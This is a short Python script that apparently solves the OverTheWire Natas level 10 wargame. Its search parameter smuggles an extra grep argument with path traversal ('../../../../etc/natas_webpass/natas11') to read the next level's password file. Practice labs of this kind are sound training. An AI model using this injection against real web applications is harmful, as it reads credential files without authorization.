#!/usr/bin/env python

import requests

URL = 'http://natas10.natas.labs.overthewire.org/index.php'
USERNAME = 'natas10'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
KEY = ''

ADDON = '?needle=.* ../../../../etc/natas_webpass/natas11'
r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
print(r.text)
